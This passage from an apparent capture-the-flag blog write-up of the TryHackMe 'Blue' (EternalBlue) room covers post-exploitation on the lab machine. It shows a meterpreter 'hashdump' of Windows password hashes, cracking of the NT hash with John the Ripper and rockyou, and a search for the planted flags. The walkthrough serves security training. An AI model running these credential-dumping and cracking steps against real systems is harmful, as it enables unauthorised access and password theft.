<p><img src="/assets/img/tryhackme/blue/i2.png" alt="i2"></p>

<p>And we are inside.</p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="4-cracking">4. Cracking</h2>

<p>Dump the non-default user’s password and crack it!</p>

<p><br></p>

<h3 id="41-within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user">4.1 Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; hashdump
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/hashdump.png" alt="hashdump"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">jon</code></strong></p>

<p><br></p>

<h3 id="42-copy-this-password-hash-to-a-file-and-research-how-to-crack-it-what-is-the-cracked-password">4.2 Copy this password hash to a file and research how to crack it. What is the cracked password?</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashdump.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/john.png" alt="john"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">alqfna22</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="5-find-flags">5. Find flags!</h2>

<p>Find the three flags planted on this machine. These are not traditional flags, rather, they’re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</p>

<p><br></p>

<h3 id="51-flag1-this-flag-can-be-found-at-the-system-root">5.1 Flag1? This flag can be found at the system root.</h3>

<p>Let’s move to the root directory to see how the file system looks like.</p>

<p><img src="/assets/img/tryhackme/blue/flag1.png" alt="flag1"></p>

<p>Our first flag is located at the root of C:\</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{access_the_machine}</code></strong></p>

<p><br></p>

<h3 id="52-flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows">5.2 Flag2? This flag can be found at the location where passwords are stored within Windows.</h3>

<p>Let’s find out where the other flags are.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; shell
&gt; dir *flag* /s /b 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/blue/shell.png" alt="shell"></p>

<p>Content of other flags.</p>

<p><img src="/assets/img/tryhackme/blue/flags.png" alt="flags"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{sam_database_elevated_access}</code></strong></p>

<p><br></p>

<h3 id="53-flag3-this-flag-can-be-found-in-an-excellent-location-to-loot-after-all-administrators-usually-have-pretty-interesting-things-saved">5.3 flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</h3>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{admin_documents_can_be_valuable}</code></strong>
<br></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br></p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 16, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">windows,</span>
          
          <span class="post__tags-item">eternal blue,</span>
          
          <span class="post__tags-item">MS17-010</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-blue/';
    this.page.identifier = '/tryhackme-blue';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
    </div>




    <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
    <footer>
  <div class="footer">
    © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
  </div>
</footer>

    <!-- script -->
    <script src="/assets/js/nav.js"></script>
    <script src="/assets/js/clip.js"></script>
    <script src="/assets/js/scroll-top.js"></script>
    <script src="/assets/js/search.js"></script>
    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "TryHackMe - Blue",
    "author": {
      "@type": "Person",
      "name": ""
    },
    "datePublished": "2023-03-16 00:00:00 +0300",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http://localhost:4000/tryhackme-blue/"
    },
    "articleSection": "TryHackMe"
  }
</script>
  </body>
</html>
